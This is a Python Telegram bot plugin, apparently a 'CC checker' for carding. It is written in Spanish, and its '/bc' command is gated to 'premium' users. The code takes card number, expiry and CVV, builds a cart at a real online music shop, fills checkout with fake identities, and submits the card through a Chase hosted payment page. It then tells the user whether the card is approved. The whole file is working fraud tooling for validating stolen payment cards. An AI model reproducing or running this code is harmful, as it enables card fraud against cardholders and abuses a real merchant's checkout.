import json
import requests
import time
import gates
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

from datos import idchat

@Client.on_message(filters.command(["bc"], ["/", "."]))
async def ch(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bc card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]

            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)

            typeCard = getTypeCard_Chase(cc)


            
            # SESSION

            s = requests.Session()

            # REQUESTS 

            params = {
                'a': 'add',
                'p': '34',
                'returnpage': 'item.php?p=34&cat=10&returnpage=shop.php%3Fpage%3D2%26cat%3D10',
                'product_added': 'yes',
            }

            r_1 = s.get('https://www.musicsupply.com/cart.php', params=params)


            params = {
                'r': '55823',
            }

            data = {
                'first_name': 'robert',
                'last_name': 'javel',
                'email': 'javiergarcas@gmail.com',
                'phone': '8541254125',
                'company': 'tu vieja',
                'address1': 'street 23',
                'address2': '',
                'city': 'ny',
                'state': 'NY',
                'zip': '10080',
                'isResidence': 'No',
                'copy': 'checkbox',
                'bill_first_name': 'robert',
                'bill_last_name': 'javel',
                'bill_company': 'tu vieja',
                'bill_address1': 'street 23',
                'bill_address2': '',
                'bill_city': 'ny',
                'bill_state': 'NY',
                'bill_zip': '10080',
                'submit': 'Continue with Checkout',
            }

            r_2 = s.post('https://www.musicsupply.com/checkout_3.php', params=params, data=data)


            data = {
                'first_name': 'robert',
                'last_name': 'javel',
                'company': 'tu vieja',
                'address1': 'street 23',
                'address2': '',
                'city': 'ny',
                'state': 'NY',
                'zip': '10080',
                'email': 'javiergarcas@gmail.com',
                'phone': '8541254125',
                'bill_first_name': 'robert',
                'bill_last_name': 'javel',
                'bill_company': 'tu vieja',
                'bill_address1': 'street 23',
                'bill_address2': '',
                'bill_city': 'ny',
                'bill_state': 'NY',
                'bill_zip': '10080',
                'isResidence': 'No',
                'order_method': 'cc',
            }

            r_3 = s.post('https://www.musicsupply.com/checkout_4.php', data=data)
            hostedSecureID = r_3.text.split('name="hostedSecureID" value="')[1].split('">')[0]
            order_id = r_3.text.split('name="order_id" value="')[1].split('">')[0]


            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-MX,es;q=0.9,es-ES;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Origin': 'https://www.musicsupply.com',
                'Referer': 'https://www.musicsupply.com/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            data = {
                'return_url': 'https://www.musicsupply.com/checkout_5.php',
                'content_template_url': 'https://www.musicsupply.com/hostedpage.htm',
                'cancel_url': 'https://www.musicsupply.com/checkout_1.php',
                'max_user_retries': '3',
                'payment_type': 'Credit_Card',
                'hostedSecureID': hostedSecureID,
                'allowed_types': 'Visa|MasterCard|American Express|Discover',
                'collectAddress': '0',
                'total_amt': '19.90',
                'collect_total_amount': '1',
                'order_description': 'Music Supply Company Order 3051',
                'order_id': order_id,
                'customer_firstname': 'robert',
                'customer_lastname': 'adsa',
                'customer_address': 'street 23',
                'customer_email': 'dadsadsxaxa@gmail.com',
                'customer_phone': '5085451254',
                'customer_city': 'ny',
                'customer_state': 'NY',
                'customer_postal_code': '10080',
                'customer_country': 'US',
                'delivery_firstname': 'robert',
                'delivery_lastname': 'adsa',
                'delivery_address': 'street 23',
                'delivery_email': 'dadsadsxaxa@gmail.com',
                'delivery_phone': '5085451254',
                'delivery_postal_code': '10080',
                'delivery_country': 'USA',
            }

            r_4 = s.post('https://www.chasepaymentechhostedpay.com/securepayments/a1/cc_collection.php', data=data, headers=headers)
            final_url = r_4.text.split('method="post" action="')[1].split('"')[0]


            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-MX,es;q=0.9,es-ES;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Origin': 'https://www.chasepaymentechhostedpay.com',
                'Referer': 'https://www.chasepaymentechhostedpay.com/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-site',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
            }


            data = {
                'name': 'robert adsa',
                'card_type': typeCard,
                'PAN': cc,
                'cresecure_cc_expires_month': mes,
                'cresecure_cc_expires_year': ano,
                'cv_data': cvv,
            }

            r_5 = s.post(final_url, data=data, headers=headers)
            messag = r_5.text.split('<span class="error_message">')[1].split('</span>')[0]
            messag = parse_error_msg(messag)
            print(messag)

            if 'Thank you for your order.' in messag:
                return await message.reply_text(f"""<b>
B3 + Chase

cc : <code>{ccs}</code>
status: success 
message : Thank you for your order. ✅
</b>""")
            elif 'Thank You' in messag:
                
                return await message.reply_text(f"""
B3 + Chase

cc : <code>{ccs}</code>
status: success 
message : Thank You✅""")
            
            
            elif 'Please try again or contact us for assistance.' in messag:
                return await message.reply_text(f"""<b>
B3 + Chase Charged $3 

cc : <code>{ccs}</code>
status: Aproved ✅
message : 2000:Aproved ✅
</b>
""")
            else:
                return await message.reply_text(f"""<b>
B3 + Chase

cc : <code>{ccs}</code>
status: DECLINED ❌
message : {messag}
</b>
""")
        else:
            return await message.reply(f'<b>⎚No es premium</b>')